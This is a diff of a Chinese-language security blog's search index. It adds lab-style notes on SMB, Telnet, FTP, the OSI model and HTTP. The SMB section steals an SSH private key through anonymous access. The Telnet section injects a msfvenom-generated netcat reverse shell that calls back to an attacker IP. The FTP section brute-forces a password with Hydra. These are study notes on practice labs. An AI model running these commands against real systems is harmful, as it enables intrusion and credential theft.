+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //10.10.118.119/profiles</span><br><span class="line"><span class="comment"># smbclient //[目标 IP]/[文件名]</span></span><br><span class="line"><span class="comment"># 通过枚举的文件名，执行命令看看有没有允许匿名访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="comment"># 找到敏感信息</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;id_rsa&quot;</span></span><br><span class="line"><span class="comment"># 下载ssh里面id_rsa到本地</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line"><span class="comment"># 设置id_rsa文件的权限，只有文件的所有者可读写，其他用户无法访问</span></span><br><span class="line"></span><br><span class="line">ssh -i id_rsa cactus@10.10.118.119</span><br><span class="line"><span class="comment"># ssh -i id_rsa [用户名]@[目标 IP]</span></span><br><span class="line"><span class="comment"># 使用id_rsa文件配合用户名和 IP 进行 ssh 连接</span></span><br></pre></td></tr></table></figure>
+
+<p>SMBClient 可用选项：</p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-U [name]</td>
+<td>指定用户名</td>
+</tr>
+<tr>
+<td>-p [port]</td>
+<td>指定端口</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+
+
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><h3 id="Telnet-是什么？"><a href="#Telnet-是什么？" class="headerlink" title="Telnet 是什么？"></a>Telnet 是什么？</h3><p>Telnet 是一种应用层协议，允许用户通过 Telnet 客户端连接到远程主机，并在该主机上执行命令。前提是远程主机正在运行 Telnet 服务器。建立连接后，客户端会作为虚拟终端，用户可以通过它与远程主机交互。</p>
+<h3 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h3><p>Telnet 以明文传输所有数据，缺乏安全机制，已在许多应用中被 SSH 替代。</p>
+<h3 id="Telnet-如何工作？"><a href="#Telnet-如何工作？" class="headerlink" title="Telnet 如何工作？"></a>Telnet 如何工作？</h3><p>用户通过 Telnet 客户端连接到服务器，并可在连接后使用特定命令在服务器上执行指令。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 10.10.200.228 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+
+<h2 id="Telnet-枚举"><a href="#Telnet-枚举" class="headerlink" title="Telnet 枚举"></a>Telnet 枚举</h2><h3 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h3><p>在利用配置错误的网络服务时，潜在的漏洞不容易发现。枚举网络服务时，需确保不遗漏任何信息</p>
+<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>通过端口扫描来识别目标机器上运行的服务、应用程序、系统结构和操作系统，获取尽可能多的基础信息<br><br></p>
+<h2 id="Telnet-利用"><a href="#Telnet-利用" class="headerlink" title="Telnet 利用"></a>Telnet 利用</h2><h3 id="Telnet-漏洞类型"><a href="#Telnet-漏洞类型" class="headerlink" title="Telnet 漏洞类型"></a>Telnet 漏洞类型</h3><p>Telnet 协议本身存在安全缺陷，缺乏加密功能，所有通信均以明文传输，且访问控制机制较弱。针对 Telnet 的漏洞较多，公开漏洞（CVE）库中包含了多个 Telnet 相关的漏洞 ID。能发现 Telnet 配置错误或运行不当进行利用</p>
+<h3 id="方法分解"><a href="#方法分解" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据在枚举阶段收集的信息：</p>
+<p>获取额外信息<br>尝试访问 Telnet 端口</p>
+<p>利用收集的信息，尝试连接和进一步获取权限，直至获得反向 Shell。</p>
+<h3 id="什么是反向-Shell？"><a href="#什么是反向-Shell？" class="headerlink" title="什么是反向 Shell？"></a>什么是反向 Shell？</h3><p>Shell 是用于在目标设备上获得代码或命令执行权限的代码或程序</p>
+<p>反向 Shell 是 Shell 类型的一种，目标机器会主动向攻击者的机器发起连接。攻击者监听本地的一个端口，通过该端口接收连接，从而实现代码或命令的执行</p>
+<h3 id="连接到-Telnet"><a href="#连接到-Telnet" class="headerlink" title="连接到 Telnet"></a>连接到 Telnet</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 10.10.44.79 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br><span class="line"><span class="comment"># 执行命令但无回显</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> tcpdump ip proto \\icmp -i ens5</span><br><span class="line"><span class="comment"># 另启窗口，进行监听，配合一下命令查看是否能收到 ping 消息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN ping 10.10.22.30 -c 1</span><br><span class="line"><span class="comment"># 在 telnet 尝试 ping 本机，查看目标主机命令是否能执行命令，能执行就可以进行下一步开始制作反向shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.44.176 lport=4444 R</span><br><span class="line"><span class="comment"># msfvenom -p cmd/unix/reverse_netcat lhost=[本机 IP] lport=[监听端口] R</span></span><br><span class="line"><span class="comment"># 另启窗口，使用msfvenom制作反向shell</span></span><br><span class="line"><span class="comment"># -p = 有效载荷</span></span><br><span class="line"><span class="comment"># R = 以原始格式导出有效载荷</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得反向shell：mkfifo /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; rm /tmp/dxtpdlx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"><span class="comment"># 另启窗口，监听本地 4444 端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN <span class="built_in">mkfifo</span> /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; <span class="built_in">rm</span> /tmp/dxtpdlx</span><br><span class="line"><span class="comment"># 在 telnet 输入反向shell命令获得权限</span></span><br></pre></td></tr></table></figure>
+<br>
+
+
+
+
+
+<h2 id="文件传输协议（FTP）"><a href="#文件传输协议（FTP）" class="headerlink" title="文件传输协议（FTP）"></a>文件传输协议（FTP）</h2><h3 id="文件传输协议（FTP）是什么？"><a href="#文件传输协议（FTP）是什么？" class="headerlink" title="文件传输协议（FTP）是什么？"></a>文件传输协议（FTP）是什么？</h3><p>文件传输协议 (FTP) 是一种用于在网络上远程传输文件的协议。它采用客户端-服务器模式，通过独立的命令和数据通道来实现高效的文件传输。</p>
+<h3 id="FTP如何工作？"><a href="#FTP如何工作？" class="headerlink" title="FTP如何工作？"></a>FTP如何工作？</h3><p>典型的 FTP 会话使用两个通道：</p>
+<p>命令通道（控制通道）：传输命令和命令的响应<br>数据通道：传输文件数据</p>
+<p>FTP 基于客户端-服务器协议。客户端发起与服务器的连接，服务器验证提供的登录凭据，成功后开启会话。会话建立后，客户端可以在服务器上执行各种 FTP 命令。</p>
+<h3 id="主动模式-vs-被动模式"><a href="#主动模式-vs-被动模式" class="headerlink" title="主动模式 vs 被动模式"></a>主动模式 vs 被动模式</h3><p>FTP 服务器可以支持主动（Active）和被动（Passive）模式，或同时支持两者。</p>
+<p>在主动 FTP 连接中，客户端打开一个端口并进行监听，服务器主动连接该端口进行数据传输<br>在被动 FTP 连接中，服务器打开一个端口并被动监听，客户端连接到该端口以传输数据</p>
+<p>将命令和数据划分到不同的通道，可在不等待数据传输完成的情况下向服务器发送命令。提高了大文件传输或慢速网络连接时的效率<br><br></p>
+<h2 id="FTP-枚举"><a href="#FTP-枚举" class="headerlink" title="FTP 枚举"></a>FTP 枚举</h2><h3 id="枚举-2"><a href="#枚举-2" class="headerlink" title="枚举"></a>枚举</h3><p>使用 nmap 进行有效的端口扫描，确认目标服务器上是否开放 FTP 服务。</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>尝试使用匿名 FTP 登录，检查是否可以访问任何文件或文件夹。查看 FTP 服务器配置中的疏漏，判断文件内容是否包含有助于在系统上获取 Shell 的信息。</p>
+<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>将登录FTP服务器，需要确保系统上安装了FTP客户端。大多数Linux操作系统通常默认安装了FTP客户端。可以通过在控制台中输入 ftp 来测试是否已安装。如果出现 ftp&gt; 提示符，则表示系统上有一个工作正常的FTP客户端。如果没有，可以使用 sudo apt install ftp 安装</p>
+<p>登录 FTP 服务器前，需确保系统上安装了 FTP 客户端。大多数 Linux 系统通常默认安装 FTP 客户端，可通过控制台输入 ftp 检查。如果出现 ftp&gt; 提示符，则表示 FTP 客户端正常工作。如果未安装，可使用以下命令安装：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ftp</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="替代枚举方法"><a href="#替代枚举方法" class="headerlink" title="替代枚举方法"></a>替代枚举方法</h3><p>一些旧版本的 in.ftpd 和其他 FTP 服务器的变体可能会通过 cwd 命令暴露用户信息。未登录时，客户端可以使用 cwd 命令检测目标目录是否存在。如果目录存在，则很可能存在对应的用户帐户。这种方法主要适用于旧版 FTP 系统。<br><br></p>
+<h2 id="FTP-利用"><a href="#FTP-利用" class="headerlink" title="FTP 利用"></a>FTP 利用</h2><h3 id="FTP漏洞类型"><a href="#FTP漏洞类型" class="headerlink" title="FTP漏洞类型"></a>FTP漏洞类型</h3><p>与 Telnet 相似，FTP 的命令和数据通道均为未加密状态，传输的数据易被中间人攻击截获和读取。如果使用弱密码或默认密码配置，FTP 服务器也会容易受到攻击</p>
+<h3 id="方法分解-1"><a href="#方法分解-1" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据枚举阶段的信息：</p>
+<p>确认目标机器上运行 FTP 服务器。<br>获取可能的用户名。<br>使用暴力破解尝试获取 FTP 服务器的密码。</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 是一款快速的在线密码破解工具，可对 50 多种协议进行字典攻击，包括 Telnet、RDP、SSH、FTP 等。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.102.137 ftp</span><br><span class="line"><span class="comment"># hydra -t 4 -l [用户名] -P [字典路径] -vV [目标 IP] ftp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 4	设置每个目标的并行连接数为4</span></span><br><span class="line"><span class="comment"># -vV	设置为详细模式，显示每次尝试的用户名和密码组合</span></span><br><span class="line"><span class="comment"># ftp / 协议	指定要攻击的协议类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp 10.10.102.137  </span><br><span class="line"><span class="comment"># ftp [目标 IP]</span></span><br><span class="line"><span class="comment"># 获取密码后，使用 ftp 进行连接</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+]]></content>
+      <categories>
+        <category>基础技能</category>
+      </categories>
+  </entry>
+  <entry>
     <title>拓展网络</title>
     <url>/2024/11/01/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD4-5/</url>
     <content><![CDATA[<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发将应用程序和服务连接到互联网。没有端口转发，Web服务器的应用程序和服务只能被同一网络内的设备访问。网站要通过互联网被公众访问，需要在路由器上配置端口转发</p>
@@ -1441,6 +1478,91 @@
 <p>第二层交换机使用设备的 MAC 地址来转发数据帧到目标设备，仅负责在局域网内将数据帧发送到正确的设备。</p>
 <p>第三层交换机可执行部分路由功能，不仅可在局域网内传输数据帧，还可根据 IP 地址将数据包路由到其他网络。第三层交换机比第二层交换机更复杂并具有路由器的某些功能</p>
 <p><strong>虚拟局域网</strong>（VLAN）允许在网络中对设备进行逻辑分区。分割使设备可共享互联网连接，同时逻辑上被隔离处理，提高网络安全性。通过 VLAN 可设置规则来控制哪些设备可相互通信<br><br></p>
+]]></content>
+      <categories>
+        <category>基本技能</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>OSI 模型</title>
+    <url>/2024/10/31/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD4-3/</url>
+    <content><![CDATA[<h2 id="什么是-OSI-模型？"><a href="#什么是-OSI-模型？" class="headerlink" title="什么是 OSI 模型？"></a>什么是 OSI 模型？</h2><p>开放系统互联模型（OSI）是网络中的基础模型，规定了联网设备如何发送、接收和解释数据的框架</p>
+<p>OSI 模型的优势在于即使网络中的设备功能和设计不同，只要遵循OSI标准就能够相互通信。遵循OSI模型可确保数据在不同设备之间被理解</p>
+<p>OSI 模型由七层组成，每层负责不同的任务，从第7层到第1层依次排列。数据在每一层传输时都会经过特定的处理过程，并附加相应的信息，这一过程称为“封装”。<br><br></p>
+<h2 id="第-1-层-物理层"><a href="#第-1-层-物理层" class="headerlink" title="第 1 层 - 物理层"></a>第 1 层 - 物理层</h2><p>第1层（物理层）是 OSI 模型的最底层，用于网络连接的物理硬件组件。在这一层，数据以电信号的形式传输，并以二进制（1和0）表示。这一层主要关注的是数据的物理传输方式和介质。<br><br></p>
+<h2 id="第-2-层-数据链路层"><a href="#第-2-层-数据链路层" class="headerlink" title="第 2 层 - 数据链路层"></a>第 2 层 - 数据链路层</h2><p>第2层（数据链路层）负责管理设备间的数据传输，并通过媒体访问控制（MAC）物理地址来标识网络中的设备。从网络层接收到包含远程计算机 IP 地址的数据包时，数据链路层会添加目标设备的 MAC 地址，以便在网络中找到具体的接收设备</p>
+<p>每台联网设备都有一个网络接口卡（NIC），其中包含唯一的 MAC 地址，由制造商设置到网卡上，无法更改但可通过技术手段进行伪造。当信息通过网络发送时，信息是根据 MAC 地址而非 IP 地址来定位的</p>
+<p>数据链路层还将数据组织成适合物理传输的格式，处理数据帧的错误检测和校正，确保传输的可靠性<br><br></p>
+<h2 id="第-3-层-网络层"><a href="#第-3-层-网络层" class="headerlink" title="第 3 层 - 网络层"></a>第 3 层 - 网络层</h2><p>第3层（网络层）负责路由和数据分组的管理。路由功能用于决定数据包传输的最佳路径。网络层将数据分组为小数据包进行传输，最后重组为完整的数据块</p>
+<p>网络层使用协议来选择数据到达目标设备的最佳路径，主要的协议包括开放最短路径优先协议（OSPF）和路由信息协议（RIP）。这些协议的路径选择基于以下因素：</p>
+<p>数据包经过的设备数量是否最少，路径是否最短<br>路径上是否存在数据丢失的风险，是否可靠<br>路径的物理传输速度是否更快</p>
+<p>一切都通过 IP 地址进行处理，路由器等利用 IP 地址传输数据包的设备被称为三层设备，因为它们在 OSI 模型的第三层工作<br><br></p>
+<h2 id="第-4-层-传输层"><a href="#第-4-层-传输层" class="headerlink" title="第 4 层 - 传输层"></a>第 4 层 - 传输层</h2><p>第4层（传输层）在设备之间传输数据时，传输层会选择以下两种协议之一：</p>
+<p>传输控制协议（TCP）<br>用户数据报协议（UDP）</p>
+<p>TCP的主要设计目的是确保数据传输的可靠性。它会在两个设备之间建立一个连接，并保持连接，直到所有数据成功传输完毕。TCP具有错误检查和确认机制，确保传输中的小数据块分段按顺序到达并重新组装</p>
+<table>
+<thead>
+<tr>
+<th>TCP 优点</th>
+<th>TCP 缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>保证数据的准确性</td>
+<td>需要设备之间建立可靠连接。如果有一小块数据未收到，则整个数据块无法使用。</td>
+</tr>
+<tr>
+<td>同步设备间的数据传输，防止设备因数据过多而过载</td>
+<td>较慢的连接会成为瓶颈，因为接收端的连接需要始终始终保持</td>
+</tr>
+<tr>
+<td>提供更多的可靠性保障</td>
+<td>由于更多的握手和确认操作，TCP 比 UDP 传输速度更慢</td>
+</tr>
+</tbody></table>
+<p>TCP 用于需要数据完整性和准确性的场景，在这些场景中丢失或不完整的数据是不接受的</p>
+<p>UDP 与 TCP 相比，不如 TCP 先进，但相对简单。UDP 不具备 TCP 的错误检查和可靠性保障。通过 UDP 发送的数据不保证一定到达接收端，也没有同步和确认机制</p>
+<table>
+<thead>
+<tr>
+<th>UDP 优点</th>
+<th>UDP 缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>传输速度比TCP快得多</td>
+<td>不保证数据的接收</td>
+</tr>
+<tr>
+<td>数据包发送速率由应用层控制</td>
+<td>不保留设备之间的持续连接</td>
+</tr>
+<tr>
+<td>对开发者更灵活性</td>
+<td>不稳定的连接会影响用户体验</td>
+</tr>
+</tbody></table>
+<p>UDP 适用于对可靠性要求不高的小数据传输场景。即使某些数据包丢失，整体效果影响不大，可优先考虑速度</p>
+<br>
+
+
+
+
+
+<h2 id="第-5-层-会话层"><a href="#第-5-层-会话层" class="headerlink" title="第 5 层 - 会话层"></a>第 5 层 - 会话层</h2><p>第5层（会话层）在数据经过表示层（第6层）正确转换和格式化后，负责创建并维护与目标计算机的连接。连接建立后，将创建会话，并在连接保持活跃的期间持续存在</p>
+<p>会话层还负责一段时间内未使用或连接丢失时关闭连接。并且会话可设置“检查点”，当数据丢失，仅需重新发送上次检查点以后的数据节省带宽</p>
+<p>每个会话是独立的，数据只能在当前会话中传输，无法跨会话传输。<br><br></p>
+<h2 id="第-6-层-表示层"><a href="#第-6-层-表示层" class="headerlink" title="第 6 层 - 表示层"></a>第 6 层 - 表示层</h2><p>第6层（表示层）是实施数据标准化的层级。由于软件开发人员以不同的方式开发软件，表示层需确保数据格式的一致性，使接收方能够正确解读数据</p>
+<p>表示层充当数据和应用层（第7层）之间的转换器。它将数据从一种格式转换为另一种格式，使得不同软件之间的数据显示保持一致</p>
+<p>数据加密等安全功能发生在此层</p>
+<br>
+
+
+
+
+
+<h2 id="第-7-层-应用层"><a href="#第-7-层-应用层" class="headerlink" title="第 7 层 - 应用层"></a>第 7 层 - 应用层</h2><p>第7层（应用层）是最接近用户的一层，应用层是制定协议和规则的层，用于确定用户应如何与发送或接收的数据进行交互</p>
+<p>日常应用程序提供图形用户界面（GUI），以便用户与发送或接收的数据进行交互。应用层协议也包括 DNS（域名系统），负责将网站地址转换为 IP 地址，使访问网络资源更加便捷，这层是用户直接接触的数据交互层<br><br></p>
 ]]></content>
       <categories>
         <category>基本技能</category>
@@ -1604,6 +1726,86 @@
       </categories>
   </entry>
   <entry>
+    <title>HTTP 详解</title>
+    <url>/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD7/</url>
+    <content><![CDATA[<h2 id="什么是-HTTP-S-？"><a href="#什么是-HTTP-S-？" class="headerlink" title="什么是 HTTP(S)？"></a>什么是 HTTP(S)？</h2><p>什么是 HTTP？（超文本传输协议）</p>
+<p>HTTP 是浏览网站时使用的协议，由蒂姆·伯纳斯-李及其团队在 1989 到 1991 年间开发。HTTP 定义了与网页服务器进行通信的规则，用于传输网页数据，比如 HTML、图片、视频等内容。</p>
+<p>什么是 HTTPS？（安全超文本传输协议）</p>
+<p>HTTPS 是 HTTP 的安全版本。HTTPS 数据是加密的，这不仅可以防止他人查看您接收和发送的数据，还能确保您连接的是真正的网页服务器，而不是冒充的服务器。<br><br></p>
+<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>当我们访问网站时，浏览器需要向网页服务器请求诸如 HTML、图片等资源，并下载相应的响应。在此之前，需要明确告诉浏览器如何以及从哪里获取这些资源，这就是 URL 的作用。</p>
+<p>什么是 URL？（统一资源定位符）<br>如果你使用过互联网，就一定用过 URL。URL 主要是关于如何在互联网上访问资源的指令。下面的图片展示了 URL 的不同部分及其作用（每次请求时不一定会用到所有部分）。</p>
+<p>一个示例 URL 的结构图，其中 http 是协议（Scheme），user:password 是用户信息，tryhackme.com 是域名或主机，80 是端口，view-room 是路径，?id&#x3D;1 是查询字符串，#task3 是片段。完整地址是 <a href="http://user:password@tryhackme.com/view-room?id=1#task3%E3%80%82">http://user:password@tryhackme.com:80/view-room?id=1#task3。</a></p>
+<p>协议（Scheme）： 指示用于访问资源的协议，如 HTTP、HTTPS、FTP（文件传输协议）。<br>用户（User）： 某些服务需要认证登录，可以在 URL 中加入用户名和密码进行登录。<br>主机（Host）： 要访问的服务器的域名或 IP 地址。<br>端口（Port）： 连接的端口，通常 HTTP 为 80，HTTPS 为 443，但可以是 1 - 65535 范围内的任意端口。<br>路径（Path）： 要访问的资源的文件名或位置。<br>查询字符串（Query String）： 可以传递给请求路径的额外信息。例如 &#x2F;blog?id&#x3D;1 表示请求 ID 为 1 的博客文章。<br>片段（Fragment）： 对请求页面中某个具体位置的引用。常用于长页面，用户可以通过直接链接到该部分以便立即查看。<br>发起请求<br>仅需一行即可向网页服务器发起请求，例如 GET &#x2F; HTTP&#x2F;1.1。</p>
+<p>然而，为了获得更丰富的网页体验，还需要发送其他数据。这些数据通过头部信息（headers）来传递，头部包含了传递给通信服务器的附加信息，我们将在“头部”任务中详细介绍。</p>
+<p>请求示例：<br>makefile<br>复制代码<br>GET &#x2F; HTTP&#x2F;1.1<br>Host: tryhackme.com<br>User-Agent: Mozilla&#x2F;5.0 Firefox&#x2F;87.0<br>Referer: <a href="https://tryhackme.com/">https://tryhackme.com/</a><br>对每行的说明：</p>
+<p>第 1 行： 发送 GET 方法（详情请参见 HTTP 方法任务），请求主页 &#x2F;，并告知服务器我们使用的是 HTTP 1.1 协议版本。<br>第 2 行： 告诉服务器请求的是 tryhackme.com 网站。<br>第 3 行： 告诉服务器我们使用的是 Firefox 87 浏览器。<br>第 4 行： 告诉服务器推荐我们到这个页面的来源是 <a href="https://tryhackme.com./">https://tryhackme.com。</a><br>第 5 行： HTTP 请求总是以空行结束，以告知服务器请求已完成。<br>响应示例：<br>php<br>复制代码<br>HTTP&#x2F;1.1 200 OK<br>Server: nginx&#x2F;1.15.8<br>Date: Fri, 09 Apr 2021 13:34:03 GMT<br>Content-Type: text&#x2F;html<br>Content-Length: 98  </p>
+<html>  
+<head>  
+    <title>TryHackMe</title>  
+</head>  
+<body>  
+    Welcome To TryHackMe.com  
+</body>  
+</html>  
+
+<p>对每行的说明：</p>
+<p>第 1 行： HTTP&#x2F;1.1 是服务器使用的 HTTP 协议版本，后接 HTTP 状态码 “200 OK”，表示请求成功。<br>第 2 行： 服务器的软件类型及版本号。<br>第 3 行： 服务器的当前日期、时间和时区。<br>第 4 行： Content-Type 告知客户端即将发送的数据类型。<br>第 5 行： Content-Length 告知客户端响应数据长度，以确认数据无缺失。<br>第 6 行： HTTP 响应包含一个空行，表示响应结束。<br>第 7-14 行： 所请求的内容，本例中是主页。<br><br></p>
+<h2 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h2><p>HTTP 方法是客户端在发起 HTTP 请求时用来表示其预期操作的一种方式。HTTP 方法有很多种，但我们将介绍最常用的几种，尤其是 GET 和 POST 方法。</p>
+<p>GET 请求<br>用于从网页服务器获取信息。</p>
+<p>POST 请求<br>用于向网页服务器提交数据，并可能创建新的记录。</p>
+<p>PUT 请求<br>用于向网页服务器提交数据以更新信息。</p>
+<p>DELETE 请求<br>用于从网页服务器删除信息或记录。</p>
+<br>
+
+
+
+
+
+<h2 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h2><p>HTTP 状态码<br>在上一个任务中，你了解到当 HTTP 服务器响应时，第一行总是包含一个状态码，用于告知客户端其请求的结果以及如何处理。这些状态码可以分为五个不同的范围：</p>
+<p>100-199 - 信息响应<br>告知客户端请求的第一部分已被接受，客户端应继续发送其余请求。这类状态码如今已不常见。</p>
+<p>200-299 - 成功<br>表示客户端的请求已成功完成。</p>
+<p>300-399 - 重定向<br>用于将客户端请求重定向到其他资源，可能是不同网页或不同网站。</p>
+<p>400-499 - 客户端错误<br>用于告知客户端请求中存在错误。</p>
+<p>500-599 - 服务器错误<br>表示服务器端出现问题，通常是服务器在处理请求时遇到较严重的问题。</p>
+<p>常见的 HTTP 状态码<br>HTTP 状态码种类繁多，且应用程序可以自定义状态码。以下是一些常见的 HTTP 响应状态码：</p>
+<p>200 - OK<br>请求成功完成。</p>
+<p>201 - Created（已创建）<br>已创建一个资源，例如新用户或新博客文章。</p>
+<p>301 - Moved Permanently（永久移动）<br>将客户端浏览器重定向到新页面，或通知搜索引擎页面已移动到其他位置。</p>
+<p>302 - Found（临时移动）<br>类似于永久重定向，但这是一个临时更改，可能会在不久的将来再次更改。</p>
+<p>400 - Bad Request（错误请求）<br>告知浏览器请求中存在错误或缺少内容，有时用于指示服务器资源需要某个特定参数，而客户端未发送。</p>
+<p>401 - Not Authorized（未授权）<br>您无权查看此资源，直到您通过用户名和密码进行授权。</p>
+<p>403 - Forbidden（禁止访问）<br>无论是否登录，您都没有权限访问该资源。</p>
+<p>405 - Method Not Allowed（方法不允许）<br>资源不允许使用此方法，例如发送 GET 请求到 &#x2F;create-account 路径，而该路径需要的是 POST 请求。</p>
+<p>404 - Page Not Found（页面未找到）<br>请求的页面或资源不存在。</p>
+<p>500 - Internal Service Error（服务器内部错误）<br>服务器遇到未知的错误，无法正常处理请求。</p>
+<p>503 - Service Unavailable（服务不可用）<br>服务器无法处理请求，可能是因为过载或正在维护。</p>
+<p>点击右侧的“查看网站”按钮，可以在浏览器中查看部分 HTTP 状态消息的示例。<br><br></p>
+<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><p>请求头部信息（Headers）<br>请求头部信息是您在发起请求时可以发送给网页服务器的附加数据。</p>
+<p>虽然发起 HTTP 请求时并不需要强制发送任何头部信息，但如果没有它们，您会发现很难正常查看一个网站。</p>
+<p>常见的请求头<br>以下是客户端（通常是您的浏览器）发送给服务器的一些常见请求头。</p>
+<p>Host（主机）： 一些服务器托管多个网站，通过提供 Host 头部信息，您可以告诉服务器您需要访问哪个网站，否则将收到服务器的默认网站。</p>
+<p>User-Agent（用户代理）： 这是您的浏览器软件及其版本号，告知服务器浏览器信息可以帮助其更好地为您的浏览器格式化网站内容。此外，某些 HTML、JavaScript 和 CSS 元素仅在特定浏览器中可用。</p>
+<p>Content-Length（内容长度）： 当您向网页服务器发送数据（例如表单数据）时，Content-Length 告诉服务器请求中包含的数据量，确保数据完整无缺。</p>
+<p>Accept-Encoding（接受编码）： 告知服务器浏览器支持的压缩方法，以便数据可以被压缩，从而减少网络传输的数据量。</p>
+<p>Cookie（Cookie）： 发送到服务器的数据，用于帮助记住您的信息（详细信息见 cookies 任务）。</p>
+<p>常见的响应头<br>以下是服务器在响应请求时返回给客户端的一些常见响应头。</p>
+<p>Set-Cookie（设置 Cookie）： 存储信息，每次请求时都会将其发送回服务器（详细信息见 cookies 任务）。</p>
+<p>Cache-Control（缓存控制）： 指定在浏览器缓存中存储响应内容的时长，到期后浏览器会再次请求内容。</p>
+<p>Content-Type（内容类型）： 告知客户端返回的数据类型，例如 HTML、CSS、JavaScript、图片、PDF、视频等。通过 Content-Type 头部信息，浏览器可以正确处理数据。</p>
+<p>Content-Encoding（内容编码）： 指定用于压缩数据的方法，以便在网络传输时减少数据量。<br><br></p>
+<h2 id="Cookies（客户端存储）"><a href="#Cookies（客户端存储）" class="headerlink" title="Cookies（客户端存储）"></a>Cookies（客户端存储）</h2><p>可能听说过 cookies，它们是一小段存储在电脑上的数据。当从网页服务器收到一个“Set-Cookie”头部时，cookies 就会被保存下来。之后，每当再次发出请求时，cookie 数据会回传给服务器。由于 HTTP 是无状态的（不会记住的上一次请求），cookies 可以用于帮助服务器识别身份、记录网站的个性化设置，或判断是否曾访问过该网站。以下是一个包含 cookies 的 HTTP 请求示例：</p>
+<p>一张图示展示了如何在 HTTP 请求中使用 cookies 来存储用户信息。</p>
+<p>Cookies 有许多用途，但最常用于网站认证。通常，cookie 的值不会是明文的密码，而是一个令牌（即一种难以被人猜到的独特代码）。</p>
+<p>查看 Cookies<br>可以通过浏览器的开发者工具轻松查看浏览器发送到网站的 cookies。如果不确定如何打开开发者工具，请点击本任务顶部的“查看网站”按钮，获取相关指南。</p>
+<p>打开开发者工具后，点击“Network”（网络）选项卡。此选项卡将显示浏览器请求的所有资源列表。可以点击任意一项，查看请求和响应的详细信息。如果浏览器发送了 cookie，可以在请求的“Cookies”选项卡中看到这些内容。</p>
+<br>
+
+]]></content>
+      <categories>
+        <category>基础技能</category>
+      </categories>
+  </entry>
+  <entry>
     <title>网站运作原理</title>
     <url>/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD9/</url>
     <content><![CDATA[<h2 id="网站是如何运作的"><a href="#网站是如何运作的" class="headerlink" title="网站是如何运作的"></a>网站是如何运作的</h2><p>在完成本课程后，您将了解网站的创建过程，并会接触一些基础的安全问题。</p>
@@ -1707,25 +1909,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Pwntools</title>
-    <url>/2024/10/29/%E5%B7%A5%E5%85%B7Pwntools/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Gallopsled/pwntools">Pwntools</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Pwntools 是一个 CTF 框架和漏洞开发库。它用 Python 编写，旨在快速进行原型设计和开发，并旨在使漏洞编写尽可能简单。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-
-
